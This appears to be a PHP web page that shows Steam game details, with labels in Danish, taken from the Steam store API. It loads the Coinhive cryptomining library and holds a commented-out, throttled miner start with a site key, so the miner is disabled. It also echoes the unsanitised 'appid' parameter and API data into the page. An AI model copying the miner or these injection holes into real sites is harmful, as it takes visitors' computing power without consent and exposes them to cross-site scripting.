<html>
  <?php
    $appid = $_GET['appid'];
    $url = 'http://store.steampowered.com/api/appdetails?appids=' . $appid . '&lang=da';
    $obj = json_decode(file_get_contents($url), true);

    if ($obj[$appid]['success'] == false) {
      http_response_code(404);
      include('404.php');
      die();
    }

    $game = $obj[$appid]['data'];
  ?>
  <head>
    <title><?php echo $game['name']?></title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
  </head>
  <style>
    body {
      background-image: url(<?php echo $game['background']?>);
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed;
    }
    .gamecard {
      min-width: 355px;
      max-width: 460px;
      margin: 0 auto;
      display: flex;
    }
    img {
      max-width: 100%;
      height: auto;
    }
  </style>
  <body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
      <a class="navbar-brand" href="./">Steamgames</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav mr-auto">
          <li class="nav-item">
            <a class="nav-link"><?php echo $game['name']; ?></a>
          </li>
        </ul>
      </div>
    </nav>
    <div class="container">
      <div class="row">
        <div class="col" style="max-width: 460px;">
          <div class="card gamecard" style="margin-top: 15px;">
            <img class="card-img-top" src="<?php echo $game['header_image']; ?>" alt="Card image cap">
            <div class="card-body">
              <h5 class="card-title">
                <?php echo $game['name']; ?>
              </h5>
              <p class="card-text">
                Genre:<?php
                  $stringToEcho = '';
                  foreach ($game['genres'] as $genre) {
                    $stringToEcho .= ' ' . $genre['description'] . ',';
                  }
                  $s = rtrim($stringToEcho, ',');
                  echo $s;
                ?>
                <br>
                Metascore: <?php echo $game['metacritic']['score']?>/100
                <br>
                Udgivelsesdato: <?php echo $game['release_date']['date']?>
              </p>
              <a href="steam://run/<?php echo $appid; ?>" class="btn btn-primary">Start spil</a>
            </div>
          </div>
          <div class="card" style="margin-top: 15px; margin-bottom: 15px;">
            <video class="img-fluid" controls poster="<?php echo $game['movies'][0]['thumbnail']; ?>">
              <source src="<?php echo $game['movies'][0]['webm']['max']; ?>" type="video/webm">
            </video>
          </div>
        </div>
        <div class="col">
          <div id="carouselExampleControls" class="carousel slide" data-ride="carousel" style="margin-top: 15px;">
            <div class="carousel-inner">
              <?php
                $first = true;
                foreach ($game['screenshots'] as $photo) {
                  if ($first) {
                    echo '
                    <div class="carousel-item active">
                      <img class="d-block w-100" src="' . $photo['path_full'] . '">
                    </div>
                    ';
                    $first = false;
                  } else {
                    echo '
                    <div class="carousel-item">
                      <img class="d-block w-100" src="' . $photo['path_full'] . '">
                    </div>
                    ';
                  }
                }
              ?>
            </div>
            <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
              <span class="carousel-control-prev-icon" aria-hidden="true"></span>
              <span class="sr-only">Previous</span>
            </a>
            <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
              <span class="carousel-control-next-icon" aria-hidden="true"></span>
              <span class="sr-only">Next</span>
            </a>
          </div>
          <div class="card" style="margin-top: 15px; margin-bottom: 15px;">
            <div class="card-body">
              <h5 class="card-title">
                Beskrivelse
              </h5>
              <p class="card-text">
                <?php echo $game['detailed_description']?>
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
  <script>
   // var miner = new CoinHive.Anonymous('gvya9Nko0AzdICUtoi6L8raWG0KDAWmG', {throttle: 0.3});
   // if (!miner.isMobile()) {
   //  miner.start();
   // }
 </script>
</html>
